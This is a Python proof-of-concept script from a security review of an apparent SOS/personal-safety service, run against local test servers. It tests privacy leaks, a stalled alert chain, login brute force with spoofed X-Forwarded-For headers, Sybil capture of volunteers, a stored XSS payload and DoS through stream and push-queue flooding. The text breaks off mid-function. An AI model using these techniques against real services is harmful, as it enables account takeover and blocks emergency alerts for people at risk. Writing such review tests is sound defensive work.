# -*- coding: utf-8 -*-
"""
sec_pocs.py - (B) proofs-of-concept for the second security review, against LOCAL servers only
(lt_server.py on 127.0.0.1 with a temp DB) or in-process with stubs (Web Push is NEVER sent: push_sender is
replaced by a local stub before any subscription exists). Nothing here touches data/ or external hosts.

    .venv/Scripts/python.exe tools/loadtest/sec_pocs.py            # all
    .venv/Scripts/python.exe tools/loadtest/sec_pocs.py ring_stall queued_leak
"""
import ast
import base64
import json
import math
import os
import random
import socket
import sys
import tempfile
import threading
import time

from lt_common import PW, ROOT, TLV, Client, ServerProc, save_result, summarize

sys.path.insert(0, ROOT)
try:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
except Exception:
    pass
RESULTS = {}
HERE_LOC = {"lat": TLV[0], "lon": TLV[1], "is_precise": True, "source": "GNSS"}
CLOSE = [TLV[0] + 0.003, TLV[1]]      # ~300 m
FAR = [TLV[0] + 0.045, TLV[1]]        # ~5 km


def record(name, verdict, severity, detail):
    RESULTS[name] = {"verdict": verdict, "severity": severity, "detail": detail}
    print(f"\n[{verdict}] ({severity}) {name}\n    " + json.dumps(detail, ensure_ascii=False, default=str)[:1500],
          flush=True)


def notes(port, tok, after=0):
    s, js, _ = Client(port).req("GET", f"/v1/notifications?after={after}&wait=0", token=tok)
    return js["notifications"]


def family(srv, extra=None):
    """dana -> contacts sis (close, rings first), mom (far, queued)."""
    users = [{"u": "dana", "display": "Dana Cohen", "contacts": ["sis", "mom"]},
             {"u": "sis", "display": "Sis", "presence": CLOSE}, {"u": "mom", "display": "Mom", "presence": FAR}]
    return srv.seed({"users": users + (extra or [])})["tokens"]


# ============================================================ ring chain
def poc_queued_leak():
    """A QUEUED contact (never told about the SOS) learns that a silent SOS is active right now when the
    relationship is cut (by either side), and later learns when it ended."""
    srv = ServerProc(tick=1.0, ring=600)
    try:
        t = family(srv)
        c = Client(srv.port)
        s, inc, _ = c.req("POST", "/v1/incidents", {"client_id": "q1", "mode": "silent", "location": HERE_LOC},
                          token=t["dana"])
        iid = inc["id"]
        st = srv.sql("SELECT username, state, ring_status FROM recipients WHERE incident_id=?", (iid,))
        before = notes(srv.port, t["mom"])
        g = c.req("GET", f"/v1/incidents/{iid}", token=t["mom"])[0]
        # mom (the queued contact - e.g. an abusive relative) disconnects from dana
        s2, js2, _ = c.req("DELETE", "/v1/connections/dana?scope=both", token=t["mom"])
        after = notes(srv.port, t["mom"])
        leak = [n for n in after if n.get("incident_id") == iid]
        # later the owner resolves -> does the disconnected/revoked contact get the closing text?
        c.req("PATCH", f"/v1/incidents/{iid}", {"status": "resolved"}, token=t["dana"])
        after2 = [n for n in notes(srv.port, t["mom"]) if n.get("incident_id") == iid]
        record("ring_queued_contact_learns_active_sos_on_disconnect",
               "CONFIRMED" if leak else "NOT REPRODUCED", "High",
               {"recipients_before": st, "mom_GET_incident_status_while_queued": g,
                "mom_notifications_before_disconnect": len(before),
                "mom_notifications_for_incident_after_disconnect": leak,
                "mom_notifications_for_incident_after_owner_resolved": after2,
                "where": "server/lifeguard_server.py:937-945 (disconnect() includes state='queued'), 1529-1532"})
    finally:
        srv.stop()


def poc_ring_stall():
    """The contact who is RINGING disconnects (or is disconnected) -> chain never advances; for a silent SOS
    volunteers are never dispatched either: the SOS reaches nobody."""
    srv = ServerProc(tick=0.3, ring=1.0)
    try:
        t = family(srv, [{"u": "vol", "vol": [TLV[0] + 0.002, TLV[1]], "verified": True}])
        c = Client(srv.port)
        s, inc, _ = c.req("POST", "/v1/incidents", {"client_id": "st1", "mode": "silent", "location": HERE_LOC},
                          token=t["dana"])
        iid = inc["id"]
        st0 = srv.sql("SELECT username, state, ring_status FROM recipients WHERE incident_id=?", (iid,))
        c.req("DELETE", "/v1/connections/dana?scope=both", token=t["sis"])     # sis was ringing
        time.sleep(8)          # = 8x the ring timeout, ~26 ticks
        st1 = srv.sql("SELECT username, role, state, ring_status FROM recipients WHERE incident_id=?", (iid,))
        mom_notes = [n for n in notes(srv.port, t["mom"]) if n.get("incident_id") == iid]
        vol_notes = [n for n in notes(srv.port, t["vol"]) if n.get("incident_id") == iid]
        # control: same thing but sis just ignores the ring
        s, inc2, _ = c.req("POST", "/v1/incidents", {"client_id": "st2", "mode": "silent", "location": HERE_LOC},
                           token=t["dana"])
        time.sleep(1)
        ctl = srv.sql("SELECT username, role, state, ring_status FROM recipients WHERE incident_id=?", (inc2["id"],))
        stalled = (not mom_notes) and (not vol_notes)
        record("ring_chain_stalls_when_ringing_contact_disconnects", "CONFIRMED" if stalled else "NOT REPRODUCED",
               "High (safety: silent SOS reaches nobody)",
               {"before": st0, "after_8s": st1, "mom_got_incident_new": bool(mom_notes),
                "volunteer_got_incident_new": bool(vol_notes), "control_incident_after_1s_(no_disconnect)": ctl,
                "where": "_ring_tick lifeguard_server.py:1114-1121 only advances rows with state IN (notified,delivered); "
                         "disconnect() sets state='revoked' and leaves ring_status='ringing' (937-941); "
                         "_needs_volunteers/run_dispatch_queue see queued contacts -> no volunteers (1130-1138, 1245-1248)"})
    finally:
        srv.stop()


def poc_volunteer_identity_on_close():
    """A volunteer who never accepted (or declined / expired) receives the owner's display name in the
    incident_closed text (also used as the Web Push lock-screen body)."""
    srv = ServerProc(tick=1.0, ack=2.0)
    try:
        t = srv.seed({"users": [{"u": "dana", "display": "Dana Cohen"},
                                {"u": "v1", "vol": [TLV[0] + 0.002, TLV[1]], "verified": True},
                                {"u": "v2", "vol": [TLV[0] + 0.003, TLV[1]], "verified": True}]})["tokens"]
        c = Client(srv.port)
        s, inc, _ = c.req("POST", "/v1/incidents", {"client_id": "vi1", "mode": "loud", "location": HERE_LOC},
                          token=t["dana"])
        iid = inc["id"]
        v_new = [n for v in ("v1", "v2") for n in notes(srv.port, t[v]) if n["type"] == "incident_new"]
        pre_accept_view = v_new[0]["payload"].get("owner_display") if v_new else None
        c.req("POST", f"/v1/incidents/{iid}/respond", {"action": "decline"}, token=t["v1"])
        c.req("PATCH", f"/v1/incidents/{iid}", {"status": "cancelled"}, token=t["dana"])
        closed = {v: [n["payload"] for n in notes(srv.port, t[v]) if n["type"] == "incident_closed"]
                  for v in ("v1", "v2")}
        from server.features import _push_payload
        push = _push_payload("incident_closed", closed["v2"][-1]) if closed["v2"] else None
        leak = any("Dana Cohen" in json.dumps(p, ensure_ascii=False) for v in closed.values() for p in v)
        record("volunteer_before_accept_gets_owner_name_on_close", "CONFIRMED" if leak else "NOT REPRODUCED",
               "Medium (regression of previous finding #14)",
               {"owner_display_shown_to_volunteer_before_accept": pre_accept_view,
                "incident_closed_payloads": closed, "web_push_lock_screen": push,
                "where": "update_incident lifeguard_server.py:1529-1532 (loops all non-queued recipients incl. "
                         "declined/expired/notified volunteers, text has owner display name)"})
    finally:
        srv.stop()


def poc_escort_after_disconnect():
    """A contact removed from the circle keeps receiving the owner's escort updates (arrival, signal-lost
    time, overdue alarm with incident id)."""
    srv = ServerProc(tick=0.5)
    try:
        t = family(srv)
        c = Client(srv.port)
        s, e, _ = c.req("POST", "/v1/escorts", {"minutes": 30, "destination": "home", "location": HERE_LOC},
                        token=t["dana"])
        eid = e["id"]
        c.req("DELETE", "/v1/connections/mom?scope=both", token=t["dana"])     # dana removes mom
        base = max([n["id"] for n in notes(srv.port, t["mom"])] or [0])
        g = c.req("GET", f"/v1/escorts/{eid}", token=t["mom"])[0]
        c.req("POST", f"/v1/escorts/{eid}/location", HERE_LOC, token=t["dana"])
        c.req("POST", f"/v1/escorts/{eid}/arrived", {}, token=t["dana"])
        leaked = [n for n in notes(srv.port, t["mom"], base) if n["type"].startswith("escort")]
        record("escort_updates_continue_after_disconnect", "CONFIRMED" if leaked else "NOT REPRODUCED", "Medium",
               {"mom_GET_escort_status_after_disconnect": g, "mom_notifications_after_disconnect": leaked,
                "where": "features.py:250-251, 281-282, 318-320 and signal_watch.py:39-41, 61-63 notify all "
                         "escort_watchers rows without re-checking the relationship; disconnect() never deletes them"})
    finally:
        srv.stop()


def poc_chat():
    """Quick replies role checks, queued-contact zero access, XSS, read receipts."""
    srv = ServerProc(tick=1.0, ring=600)
    try:
        t = family(srv, [{"u": "vol", "display": "Volunteer", "vol": [TLV[0] + 0.002, TLV[1]], "verified": True}])
        c = Client(srv.port)
        s, inc, _ = c.req("POST", "/v1/incidents", {"client_id": "ch1", "mode": "loud", "location": HERE_LOC},
                          token=t["dana"])
        iid = inc["id"]
        r = {}
        r["owner_sends_responder_quick"] = c.req("POST", f"/v1/incidents/{iid}/messages", {"quick": "on_my_way"},
                                                 token=t["dana"])[0]
        r["volunteer_msg_before_accept"] = c.req("POST", f"/v1/incidents/{iid}/messages", {"text": "hi"},
                                                 token=t["vol"])[0]
        r["volunteer_read_before_accept"] = c.req("POST", f"/v1/incidents/{iid}/messages/read", {"up_to_id": 9},
                                                  token=t["vol"])[0]
        for path, body in (("", None), ("/messages", {"text": "x"}), ("/messages/read", {"up_to_id": 1}),
                           ("/respond", {"action": "accept"})):
            r[f"queued_mom{path or ' GET'}"] = c.req("POST" if body else "GET", f"/v1/incidents/{iid}{path}", body,
                                                    token=t["mom"])[0]
        xss = '<img src=x onerror=alert(1)><script>alert(2)</script>'
        r["xss_stored_status"] = c.req("POST", f"/v1/incidents/{iid}/messages", {"text": xss}, token=t["dana"])[0]
        c.req("POST", f"/v1/incidents/{iid}/respond", {"action": "accept"}, token=t["vol"])
        c.req("POST", f"/v1/incidents/{iid}/messages/read", {"up_to_id": 10 ** 6}, token=t["sis"])   # sis reads
        view = c.req("GET", f"/v1/incidents/{iid}", token=t["vol"])[1]
        r["volunteer_sees_responders"] = [x["display_name"] for x in view.get("responders", [])]
        r["volunteer_sees_read_by"] = [m["read_by"] for m in view.get("messages", [])]
        r["stored_text_raw"] = view["messages"][0]["text"] if view.get("messages") else None
        # rate limit is per (incident, sender): a new incident resets it
        codes = [c.req("POST", f"/v1/incidents/{iid}/messages", {"text": f"m{i}"}, token=t["dana"])[0]
                 for i in range(25)]
        s, inc2, _ = c.req("POST", "/v1/incidents", {"client_id": "ch2", "mode": "silent", "location": HERE_LOC},
                           token=t["dana"])
        codes2 = [c.req("POST", f"/v1/incidents/{inc2['id']}/messages", {"text": f"m{i}"}, token=t["dana"])[0]
                  for i in range(20)]
        r["msg_codes_same_incident"] = {k: codes.count(k) for k in set(codes)}
        r["msg_codes_new_incident_after_limit"] = {k: codes2.count(k) for k in set(codes2)}
        # owner-quiet flag
        own = [n["payload"] for n in notes(srv.port, t["dana"]) if n["payload"].get("event") == "message"]
        r["owner_silent_incident_message_payload_quiet"] = [p.get("quiet") for p in own][-3:]
        record("chat_role_checks_and_queued_access", "NOT VULNERABLE (checks hold)" if (
            r["owner_sends_responder_quick"] == 400 and r["volunteer_msg_before_accept"] == 403 and
            all(v == 404 for k, v in r.items() if k.startswith("queued_mom"))) else "CHECK", "Info", r)
        record("chat_read_receipts_reveal_family_names_to_volunteer",
               "CONFIRMED" if any("Sis" in x for x in r["volunteer_sees_read_by"]) and "Sis" not in
               r["volunteer_sees_responders"] else "NOT REPRODUCED", "Low",
               {"responders_list": r["volunteer_sees_responders"], "read_by": r["volunteer_sees_read_by"],
                "where": "_messages_view lifeguard_server.py:1640-1660"})
        record("chat_rate_limit_resets_per_new_incident", "CONFIRMED", "Low",
               {"same": r["msg_codes_same_incident"], "new_incident": r["msg_codes_new_incident_after_limit"],
                "where": "add_message 1597-1600 (per incident+sender only; create_incident has no rate limit)"})
    finally:
        srv.stop()


# ============================================================ sessions / password / login
def poc_sessions_and_password():
    srv = ServerProc(tick=1.0)
    try:
        t = srv.seed({"users": [{"u": "alice"}, {"u": "bob"}]})["tokens"]
        c = Client(srv.port)
        # attacker holds a stolen alice token (t['alice']); alice logs in from her phone
        s, lg, _ = c.req("POST", "/v1/auth/login", {"username": "alice", "password": PW, "device": "alice-phone"})
        alice_phone = lg["token"]
        # (1) old-password guessing through /me/password: is there any throttle?
        codes, lat = [], []
        for i in range(40):
            st, js, dt = c.req("POST", "/v1/me/password", {"old_password": f"guess{i}", "new_password": "x" * 12},
                               token=t["alice"])
            codes.append(st)
            lat.append(dt)
        # (2) token holder (no password) kicks all of alice's other devices
        sess = c.req("GET", "/v1/me/sessions", token=t["alice"])[1]
        rv = c.req("DELETE", "/v1/me/sessions", token=t["alice"])[1]
        phone_after = c.req("GET", "/v1/me", token=alice_phone)[0]
        # (3) cross-user revoke with a known 16-hex id
        s, lg2, _ = c.req("POST", "/v1/auth/login", {"username": "alice", "password": PW, "device": "p2"})
        sid = [x for x in c.req("GET", "/v1/me/sessions", token=lg2["token"])[1]["sessions"] if x["current"]][0]["id"]
        cross = c.req("DELETE", f"/v1/me/sessions?id={sid}", token=t["bob"])[1]
        still = c.req("GET", "/v1/me", token=lg2["token"])[0]
        record("password_change_old_password_bruteforce_unthrottled",
               "CONFIRMED" if 429 not in codes else "NOT REPRODUCED", "Medium",
               {"statuses_40_wrong_guesses": {k: codes.count(k) for k in set(codes)},
                "per_guess_ms": summarize(lat), "where": "change_password lifeguard_server.py:438-443"})
        record("stolen_token_can_revoke_all_other_sessions_without_reauth", "CONFIRMED" if phone_after == 401 else
               "NOT REPRODUCED", "Medium-Low", {"sessions_listed": len(sess["sessions"]), "revoke_result": rv,
                                                "alice_phone_after": phone_after,
                                                "where": "revoke_sessions 462-472 (no password, no notification)"})
        record("session_id_prefix_cross_user_revoke", "NOT VULNERABLE" if cross["revoked"] == 0 and still == 200
               else "CONFIRMED", "Info", {"bob_revoke_alice_sid": cross, "alice_session_after": still,
                                          "note": "id = sha256(token)[:16] (64 bits), scoped by username=?"})
    finally:
        srv.stop()


def poc_login_lockout():
    out = {}
    # (a) no proxy env: X-Forwarded-For ignored (good) - but one shared IP = one lock for everyone
    srv = ServerProc(tick=1.0)
    try:
        t = srv.seed({"users": [{"u": f"u{i}"} for i in range(40)] + [{"u": "victim"}]})["tokens"]
        c = Client(srv.port)
        codes = []
        for i in range(31):
            codes.append(c.req("POST", "/v1/auth/login", {"username": f"u{i}", "password": "wrong"},
                               headers={"X-Forwarded-For": f"10.0.{i}.1"})[0])
        out["no_proxy_31_fails_spoofed_xff"] = {k: codes.count(k) for k in set(codes)}
        out["no_proxy_victim_correct_password_same_ip"] = c.req("POST", "/v1/auth/login",
                                                               {"username": "victim", "password": PW})[0]
        # (c) per-user counter never decays: 4 fails, (no time-based reset), later 1 more -> locked
    finally:
        srv.stop()
    srv = ServerProc(tick=1.0)
    try:
        srv.seed({"users": [{"u": "carol"}]})
        c = Client(srv.port)
        for i in range(4):
            c.req("POST", "/v1/auth/login", {"username": "carol", "password": "typo"})
        time.sleep(2)
        c.req("POST", "/v1/auth/login", {"username": "carol", "password": "typo-days-later"})
        out["counter_never_decays_then_correct_pw"] = c.req("POST", "/v1/auth/login",
                                                          {"username": "carol", "password": PW})[0]
    finally:
        srv.stop()
    # (b) LIFEGUARD_BEHIND_PROXY=1 but the app port is reachable directly (e.g. `docker run -p 8765:8765`):
    srv = ServerProc(tick=1.0, extra_env={"LIFEGUARD_BEHIND_PROXY": "1"})
    try:
        srv.seed({"users": [{"u": "victim"}]})
        c = Client(srv.port)
        codes = []
        t0 = time.perf_counter()
        for i in range(60):
            codes.append(c.req("POST", "/v1/auth/login", {"username": "victim", "password": f"guess{i}"},
                               headers={"X-Forwarded-For": f"203.0.113.{i % 250}"})[0])
        out["proxy_env_direct_60_guesses_rotating_xff"] = {k: codes.count(k) for k in set(codes)}
        out["proxy_env_guess_rate_per_s"] = round(60 / (time.perf_counter() - t0), 1)
        codes = []
        for i in range(8):
            codes.append(c.req("POST", "/v1/auth/login", {"username": "victim", "password": f"g{i}"},
                               headers={"X-Forwarded-For": "198.51.100.7, 203.0.113.9"})[0])
        out["proxy_env_last_xff_hop_used_(same_last_hop)"] = {k: codes.count(k) for k in set(codes)}
    finally:
        srv.stop()
    record("login_lockout_and_xff", "CONFIRMED (conditional)", "Medium", {
        **out, "where": "_client_ip lifeguard_server.py:1935-1941; login 400-417; _login_failed 391-398 "
                        "(dict cleared at 50k keys => lockouts can be flushed by an attacker with many IPs/IPv6 /64)"})


def poc_registration():
    srv = ServerProc(tick=1.0)
    try:
        c = Client(srv.port)
        codes, lat = [], []
        for i in range(40):
            st, js, dt = c.req("POST", "/v1/auth/register", {"username": f"sybil{i}", "password": "Sybil!2026x"})
            codes.append(st)
            lat.append(dt)
        record("registration_unlimited_no_rate_limit", "CONFIRMED" if codes.count(200) == 40 else "PARTIAL",
               "Medium (enables Sybil bypass of every per-account abuse control; PBKDF2 CPU cost)",
               {"statuses": {k: codes.count(k) for k in set(codes)}, "latency": summarize(lat),
                "where": "register lifeguard_server.py:369-381, route 1929-1932"})
    finally:
        srv.stop()


# ============================================================ abuse.py bypasses
def poc_sybil_capture():
    srv = ServerProc(tick=1.0, ack=600)
    try:
        vols = [{"u": f"v{i}", "vol": [TLV[0] + 0.001 * i, TLV[1]], "verified": True} for i in range(6)]
        atk = [{"u": f"atk{i}"} for i in range(4)]
        t = srv.seed({"users": vols + atk + [{"u": "victim", "display": "Real Victim"}]})["tokens"]
        c = Client(srv.port)
        risk = {"level": "HIGH", "score": 16, "reasons": ["x"]}
        for i in range(4):
            for k in range(2):
                c.req("POST", "/v1/incidents", {"client_id": f"a{i}{k}", "mode": "silent", "emergency_type": "security",
                                                "severity": "critical", "risk": risk, "location": HERE_LOC},
                      token=t[f"atk{i}"])
        time.sleep(2.5)
        busy = srv.sql("""SELECT COUNT(DISTINCT r.username) AS n FROM recipients r JOIN incidents i ON i.id=r.incident_id
                          WHERE i.owner LIKE 'atk%' AND r.role='volunteer' AND r.state IN ('notified','delivered')""")[0]["n"]
        s, inc, _ = c.req("POST", "/v1/incidents", {"client_id": "real", "mode": "loud", "emergency_type": "medical",
                                                    "severity": "high", "location": HERE_LOC}, token=t["victim"])
        time.sleep(3)
        got = srv.sql("SELECT username, state FROM recipients WHERE incident_id=? AND role='volunteer'", (inc["id"],))
        ev = srv.sql("SELECT kind FROM incident_events WHERE incident_id=?", (inc["id"],))
        record("abuse_sybil_accounts_capture_all_volunteers", "CONFIRMED" if not got else "NOT REPRODUCED", "High",
               {"volunteers": 6, "attacker_accounts": 4, "volunteers_held_by_attacker": busy,
                "victim_volunteer_recipients_after_3s": got, "victim_events": [e["kind"] for e in ev],
                "note": "MAX_ACTIVE_WITH_VOLUNTEERS=2 and the hourly cap are per account; registration is free; "
                        "victim cannot preempt (attacker priority >= victim + PREEMPT_MARGIN)",
                "where": "abuse.py:26, lifeguard_server.py:1250-1255, 1299-1308"})
    finally:
        srv.stop()


def poc_quick_cancel_gaming():
    srv = ServerProc(tick=1.0)
    try:
        vols = [{"u": f"v{i}", "vol": [TLV[0] + 0.001 * i, TLV[1]], "verified": True} for i in range(4)]
        t = srv.seed({"users": vols + [{"u": "res"}, {"u": "can"}]})["tokens"]
        c = Client(srv.port)
        for who, status in (("res", "resolved"), ("can", "cancelled")):
            for k in range(3):
                s, inc, _ = c.req("POST", "/v1/incidents", {"client_id": f"{who}{k}", "mode": "loud",
                                                            "location": HERE_LOC}, token=t[who])
                time.sleep(0.3)
                c.req("PATCH", f"/v1/incidents/{inc['id']}", {"status": status}, token=t[who])
        ab = {w: srv.call("owner_abuse", owner=w) for w in ("res", "can")}
        record("abuse_quick_cancel_counter_bypassed_by_resolving", "CONFIRMED" if (not ab["res"]["limited"] and
               ab["can"]["limited"]) else "NOT REPRODUCED", "Low-Medium",
               {"owner_abuse": ab, "where": "owner_abuse lifeguard_server.py:1173-1176 counts only status='cancelled' "
                                            "within 120 s; 'resolved' or cancel at 121 s is never counted"})
    finally:
        srv.stop()


# ============================================================ resource exhaustion (authenticated)
def poc_walks_and_health():
    srv = ServerProc(tick=1.0)
    try:
        t = srv.seed({"users": [{"u": f"w{i}"} for i in range(4)] + [{"u": "probe"}]})["tokens"]
        c = Client(srv.port)
        rng = random.Random(3)
        obs = lambda: [{"lat": TLV[0] + rng.uniform(-0.01, 0.01), "lon": TLV[1] + rng.uniform(-0.01, 0.01),
                        "attributes": {"lighting": 0.5}, "luminance": 0.4, "observed_at": time.time()}
                       for _ in range(200)]
        body = lambda: {"consent": {"accepted": True, "version": "walk-1.1"}, "observations": obs()}
        curve, statuses = [], {}
        for acct in range(4):
            lat = []
            for k in range(251):
                st, js, dt = c.req("POST", "/v1/street-intel/walks", body(), token=t[f"w{acct}"])
                statuses[st] = statuses.get(st, 0) + 1
                lat.append(dt)
            total = srv.sql("SELECT COUNT(*) AS n FROM street_observations")[0]["n"]
            hp = [c.req("GET", "/v1/health")[2] for _ in range(3)]
            mw = c.req("GET", "/v1/street-intel/walks", token=t[f"w{acct}"])[2]
            curve.append({"rows_total": total, "walk_post": summarize(lat[-50:]), "last_status": st,
                          "GET_health_ms(unauth, PRAGMA quick_check)": round(min(hp) * 1000, 1),
                          "GET_my_walks_ms": round(mw * 1000, 1)})
            print("   ", curve[-1], flush=True)
        bad = c.req("POST", "/v1/street-intel/walks", {"consent": {"accepted": True, "version": "1"},
                                                        "observations": [{"lat": 32, "lon": 34,
                                                                          "attributes": {"lighting": "abc"}}]},
                    token=t["probe"])[0]
        plan = srv.sql("EXPLAIN QUERY PLAN SELECT COUNT(*) AS n FROM street_observations WHERE submitted_by=?", ("w0",))
        record("walks_quota_per_account_and_unindexed_scans", "CONFIRMED", "Medium",
               {"statuses": statuses, "curve": curve, "invalid_attribute_status": bad,
                "query_plan_quota_count": plan, "db_mb": srv.stats().get("db_mb"),
                "where": "submit_walk 1719-1726 (COUNT + json_extract without index, under the global lock); "
                         "health 1774-1777 + storage.sqlite_health (PRAGMA quick_check on every unauthenticated call)"})
    finally:
        srv.stop()


def poc_invitation_churn():
    srv = ServerProc(tick=1.0)
    try:
        t = srv.seed({"users": [{"u": "inv"}]})["tokens"]
        c = Client(srv.port)
        srv.stats(reset=True)
        time.sleep(3)
        base = srv.stats(reset=True)["timings"].get("tick:_expire_invitations", {})
        n = 0
        t0 = time.perf_counter()
        for i in range(3000):
            s, js, _ = c.req("POST", "/v1/invitations", {"code": True}, token=t["inv"])
            if s == 200:
                c.req("POST", f"/v1/invitations/{js['id']}/cancel", {}, token=t["inv"])
                n += 1
        dt = time.perf_counter() - t0
        srv.stats(reset=True)
        time.sleep(3)
        after = srv.stats()["timings"].get("tick:_expire_invitations", {})
        plan = srv.sql("EXPLAIN QUERY PLAN SELECT * FROM invitations WHERE status='pending' AND expires_at<=?", (0,))
        record("invitation_create_cancel_churn_unbounded", "CONFIRMED", "Low-Medium",
               {"created_and_cancelled": n, "seconds": round(dt, 1),
                "rows": srv.sql("SELECT COUNT(*) AS n FROM invitations")[0]["n"],
                "tick_expire_invitations_ms_before": base, "after": after, "query_plan": plan,
                "where": "create_invitation 675-684 caps only *pending*; _expire_invitations 667-673 runs every tick "
                         "without an index on status"})
    finally:
        srv.stop()


def poc_trusted_notify_and_escort_spam():
    srv = ServerProc(tick=1.0)
    try:
        t = family(srv)
        c = Client(srv.port)
        codes = [c.req("POST", "/v1/trusted/notify", {"text": "spam", "type": "test"}, token=t["dana"])[0]
                 for _ in range(100)]
        esc = []
        for i in range(20):
            s, e, _ = c.req("POST", "/v1/escorts", {"minutes": 5}, token=t["dana"])
            esc.append(s)
            c.req("POST", f"/v1/escorts/{e['id']}/cancelled", {}, token=t["dana"])
        inc = [c.req("POST", "/v1/incidents", {"client_id": f"sp{i}", "mode": "loud", "location": HERE_LOC},
                     token=t["dana"])[0] for i in range(30)]
        kinds = {r["type"]: r["n"] for r in srv.sql(
            "SELECT type, COUNT(*) AS n FROM notifications WHERE username='sis' GROUP BY type")}
        record("contact_notification_spam_unlimited (test/escort_started/incident_new are Web-Push types)",
               "CONFIRMED", "Low", {"trusted_notify": {k: codes.count(k) for k in set(codes)},
                                    "escorts_started": esc.count(200), "incidents_created": inc.count(200),
                                    "sis_notifications_by_type": kinds,
                                    "where": "notify_trusted 998-1004, start_escort features.py:169-195, "
                                             "create_incident 1023 - none rate-limited"})
    finally:
        srv.stop()


def poc_many_streams_one_user():
    srv = ServerProc(tick=1.0)
    try:
        t = srv.seed({"users": [{"u": "eve"}]})["tokens"]
        before = srv.stats()["threads_os"]
        socks = []
        for i in range(300):
            s = socket.create_connection(("127.0.0.1", srv.port))
            s.sendall(f"GET /v1/stream HTTP/1.1\r\nHost: x\r\nAuthorization: Bearer {t['eve']}\r\n\r\n".encode())
            socks.append(s)
        time.sleep(3)
        ok = 0
        for s in socks:
            s.settimeout(5)
            try:
                if b"200" in s.recv(200):
                    ok += 1
            except OSError:
                pass
        st = srv.stats()
        record("unlimited_concurrent_streams_per_user", "CONFIRMED" if ok > 250 else "PARTIAL", "Medium (DoS)",
               {"sse_opened_with_one_token": ok, "server_threads_before": before, "after": st["threads_os"],
                "rss_mb": st["rss_mb"], "where": "_stream 2154-2180 / ThreadingHTTPServer: no per-user or global "
                                                  "connection cap, 300 s per stream"})
        for s in socks:
            s.close()
    finally:
        srv.stop()


def poc_osrm_blackhole():
    """OSRM URL is admin config only (env). But a slow/blackholed OSRM blocks dispatch 1.5 s per call under
    _dispatch_lock, which create_incident also takes."""
    lsock = socket.socket()
    lsock.bind(("127.0.0.1", 0))
    lsock.listen(100)
    held = []
    stop = threading.Event()

    def acceptor():
        lsock.settimeout(0.5)
        while not stop.is_set():
            try:
                held.append(lsock.accept()[0])     # accept and never answer
            except OSError:
                pass
    threading.Thread(target=acceptor, daemon=True).start()
    port = lsock.getsockname()[1]
    srv = ServerProc(tick=1.0, extra_env={"LIFEGUARD_OSRM_URL": f"http://127.0.0.1:{port}"})
    try:
        vols = [{"u": f"v{i}", "vol": [TLV[0] + 0.001 * i, TLV[1]], "verified": True} for i in range(3)]
        t = srv.seed({"users": vols + [{"u": f"o{i}"} for i in range(8)]})["tokens"]
        lat = []
        res = [None] * 8

        def one(i):
            res[i] = Client(srv.port, timeout=120).req("POST", "/v1/incidents", {
                "client_id": f"os{i}", "mode": "loud", "location": HERE_LOC}, token=t[f"o{i}"])[2]
        ths = [threading.Thread(target=one, args=(i,)) for i in range(8)]
        for th in ths:
            th.start()
        for th in ths:
            th.join()
        h = Client(srv.port).req("GET", "/v1/circle", token=t["o0"])[2]
        time.sleep(4)
        tk = srv.stats()["timings"]
        record("osrm_slow_or_down_blocks_dispatch_and_sos_creation", "CONFIRMED", "Medium (availability)",
               {"8_concurrent_POST_incidents_ms": summarize(res), "unrelated_GET_circle_ms": round(h * 1000, 1),
                "tick": tk.get("TICK_TOTAL"), "dispatch_calls": tk.get("req:_dispatch_next_volunteer"),
                "ssrf": "base URL only from LIFEGUARD_OSRM_URL env (routing.py:36); user input reaches only "
                        "float-formatted coordinates -> no SSRF from users",
                "where": "routing.py:19,59 (1.5 s timeout, no circuit breaker) called from _dispatch_next_volunteer "
                         "1328 under _dispatch_lock"})
    finally:
        srv.stop()
        stop.set()
        for s in held:
            s.close()
        lsock.close()


# ============================================================ in-process: Web Push queue starvation
def poc_push_queue_starvation():
    from server.lifeguard_server import LifeGuardService
    d = tempfile.mkdtemp(prefix="lg_push_poc_")
    svc = LifeGuardService(os.path.join(d, "p.db"))
    calls = []

    def stub(vapid, sub, data, urgency="normal"):      # NO network: simulated 30 ms push-service RTT
        time.sleep(0.03)
        calls.append((time.perf_counter(), sub["username"], json.loads(json.dumps(data))["type"]))
        return 201, None
    svc.push_sender = stub
    for u in ("eve", "eve2", "victim", "dana"):
        svc.register(u, PW)
    svc._x("INSERT INTO relationships(owner, contact, status, created_at, responded_at) VALUES ('eve2','eve','accepted',0,0)")
    svc._x("INSERT INTO relationships(owner, contact, status, created_at, responded_at) VALUES ('dana','victim','accepted',0,0)")
    p256 = base64.urlsafe_b64encode(b"\x04" + os.urandom(64)).decode().rstrip("=")
    auth = base64.urlsafe_b64encode(os.urandom(16)).decode().rstrip("=")
    for i in range(300):
        svc.push_subscribe("eve", {"endpoint": f"https://fcm.googleapis.com/fcm/send/fake{i}",
                                   "keys": {"p256dh": p256, "auth": auth}})
    svc.push_subscribe("victim", {"endpoint": "https://fcm.googleapis.com/fcm/send/victim",
                                  "keys": {"p256dh": p256, "auth": auth}})
    for _ in range(3):
        svc.notify_trusted("eve2", "x", "test")          # 3 x 300 pushes queued
    t0 = time.perf_counter()
    svc.create_incident("dana", "real-sos", "loud", location={"lat": TLV[0], "lon": TLV[1]})
    end = time.time() + 90
    while time.time() < end and not any(u == "victim" for _, u, _ in calls):
        time.sleep(0.2)
    hit = [t for t, u, _ in calls if u == "victim"]
    record("web_push_single_worker_starved_by_one_user", "CONFIRMED" if hit and hit[0] - t0 > 10 else "CHECK",
           "Medium-High (delays SOS lock-screen alerts for everyone)",
           {"attacker_subscriptions": 300, "queued_pushes_before_sos": 900,
            "victim_sos_push_delay_s(sim_30ms_rtt)": round(hit[0] - t0, 1) if hit else ">90",
            "where": "features.py:95-133 one LG-WebPush thread, FIFO, no per-user subscription cap (push_subscribe "
                     "144-158); real push RTT 50-300 ms makes it worse"})
    svc.close()


# ============================================================ client-side crypto / privacy
def poc_vault_and_kws_crypto():
    import storage
    import evidence_vault as EV
    import personal_kws as PK
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    d = tempfile.mkdtemp(prefix="lg_vault_poc_")
    out = {"pywin32_in_this_venv": storage.HAS_DPAPI,
           "pywin32_in_requirements": any("pywin32" in open(os.path.join(ROOT, f), encoding="utf-8").read()
                                          for f in ("requirements.txt", "requirements-windows.txt")),
           "cryptography_in_client_requirements": any(
               "cryptography" in open(os.path.join(ROOT, f), encoding="utf-8").read()
               for f in ("requirements.txt", "requirements-windows.txt"))}
    old = storage.HAS_DPAPI
    storage.HAS_DPAPI = False                       # = fresh install without pywin32 (also non-Windows)
    try:
